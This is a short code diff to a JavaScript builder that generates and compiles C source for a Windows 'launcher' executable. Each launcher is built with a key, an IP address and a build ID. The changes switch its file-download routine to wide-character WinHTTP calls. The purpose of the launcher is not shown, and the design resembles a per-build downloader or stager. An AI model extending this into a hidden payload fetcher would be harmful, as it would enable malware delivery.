@@ -78,6 +78,8 @@ function cSource(meta, key, ip, buildId) {
   const safeKey = esc4c(key);
 
   return String.raw`
+#define UNICODE
+#define _UNICODE
 #include <windows.h>
 #include <winhttp.h>
 #include <shlobj.h>
@@ -115,8 +117,9 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
     uc.lpszHostName = host; uc.dwHostNameLength = 256;
     uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
     
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
-        printf("[-] WinHttpCrackUrl failed: %lu\n", GetLastError());
+    // FIX: Use WinHttpCrackUrlW explicitly so it parses the Wide string correctly
+    if (!WinHttpCrackUrlW(url, 0, 0, &uc)) {
+        printf("[-] WinHttpCrackUrlW failed: %lu\n", GetLastError());
         return 0;
     }
 
@@ -135,9 +138,9 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
         return 0;
     }
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    HINTERNET hRequest = WinHttpOpenRequestW(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) {
-        printf("[-] WinHttpOpenRequest failed: %lu\n", GetLastError());
+        printf("[-] WinHttpOpenRequestW failed: %lu\n", GetLastError());
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
         return 0;
@@ -324,7 +327,6 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     
-    // CHANGED TO -mconsole SO YOU CAN SEE THE DEBUG OUTPUT
     await execFileP(CC, ['-O2', '-s', '-mconsole', '-o', outPath, cPath, resPath,
                          '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32', '-lwinhttp'],
                     { cwd: workDir, timeout: 60_000 });
